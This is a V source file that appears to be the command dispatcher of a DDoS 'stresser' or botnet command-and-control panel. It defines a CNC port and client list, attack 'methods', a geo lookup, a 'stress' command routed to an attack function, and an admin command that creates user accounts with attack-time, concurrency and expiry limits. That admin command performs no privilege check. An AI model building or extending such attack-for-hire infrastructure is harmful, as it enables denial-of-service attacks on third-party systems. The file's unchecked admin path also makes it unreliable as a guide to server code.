module server

import net
import banner_sys
import config 
import auth


//cmds
import commands


// #include "@VROOT/c_headers/testfd.c"

// fn C.r_keys(int) string

pub struct ServerAssets {
	pub mut:
		empty_c int
		cnc_port string
		clients []net.TcpConn

}

pub struct Test{
	pub mut:
		lul []ServerAssets
}

pub fn cmd_handler(mut socket net.TcpConn, data string, username string) {
	// println('$socket \r\n\r\n ${socket.sock}\r\n\r\n')
	// println(socket.sock)
	if data.len == 0 {
		socket.write_string(config.Hostname) or { 0 }
	} else {
		if data == "" { return }
		mut c := config.Config{}
		mut b := banner_sys.Banner{}
		if data.contains(" ") {
			c.set_config_info((data.split(" ")[0]), data, (data.split(" ")), ((data.split(" ")).len))
		} else { c.set_config_info(data, data, [data], data.len) }
		
		match c.cmd {
			"home" {	
				b.set_bannerfile('main')
				mut main_banner := b.color_banner()
				b.set_bannerfile('dashboard')
				socket.write_string(config.Clear + "${main_banner} ${b.color_banner()}") or { 0 }
			}
			"help" {	
				b.set_bannerfile('help')
				socket.write_string(b.color_banner()) or { 0 }
			}
			"clear" {
				b.set_bannerfile('main')
				socket.write_string(config.Clear + b.color_banner()) or { 0 }
			} 
			"whoami" {
				socket.write_string("${username}\r\n") or { 0 }
			}
			"info" {
				mut cf := auth.CrudFunc{user: username}
				socket.write_string(cf.myinfo()) or { 0 }
			}
			"changepw" {
				commands.changepw_cmd(mut socket, data, username)
			}
			"methods" {	
				b.set_bannerfile("methods")
				socket.write_string(b.color_banner()) or { 0 }
			}
			"geo" {
				commands.geo_cmd(mut socket, data)
			} 
			"stress" {
				commands.attack_cmd(mut socket, data.split(" "),  username)
			}
			"admin" {
				admin_handler(mut socket, data, username)
			} else {
				socket.write_string("[x] Error, No command found") or { 0 }
			}
		}

		// if data == "home" {
		// 	b.set_bannerfile('main')
		// 	mut main_banner := b.color_banner()
		// 	b.set_bannerfile('dashboard')
		// 	socket.write_string("${main_banner} ${b.color_banner()}") or { 0 }
		// } else if data == "help" {
		// 	b.set_bannerfile('help')
		// 	socket.write_string(b.color_banner()) or { 0 }
		// } else if data == "clear" {
		// 	b.set_bannerfile('main')
		// 	socket.write_string(config.Clear + b.color_banner()) or { 0 }
		// } else if c.cmd == "whoami" {
		// 	socket.write_string("${username}\r\n") or { 0 }
		// } else if c.cmd == "info" {
		// 	mut cf := auth.CrudFunc{user: username}
		// 	socket.write_string(cf.myinfo()) or { 0 }
		// } else if c.cmd == "methods" {
		// 	b.set_bannerfile("methods")
		// 	socket.write_string(b.color_banner()) or { 0 }
		// } else if data == "geo" {
		// 	commands.geo_cmd(mut socket, c.arg[1])
		// } else if c.cmd == "stress" {
		// 	commands.attack_cmd(mut socket, data.split(" "),  username)
		// } else if c.cmd == "admin" {
		// 	admin_handler(mut socket, data, username)
		// }
		socket.write_str(config.Hostname) or { 0 }
		println(data) // send this to the new logger when finished
	}
}

pub fn admin_handler(mut socket net.TcpConn, data string, username string) {
	mut arg := data.split(" ")
	mut cmd := arg[0]
	mut admin_cmd := arg[1]

	if admin_cmd == "add" {
		mut p := auth.Crud{user: arg[2], pw: arg[3], lvl: arg[4].int(), mtime: arg[5].int(), conn: arg[6].int(), admin: arg[7].int(), expiry: arg[8]}
		socket.write_string(p.add_user()) or { 0 }
	}
}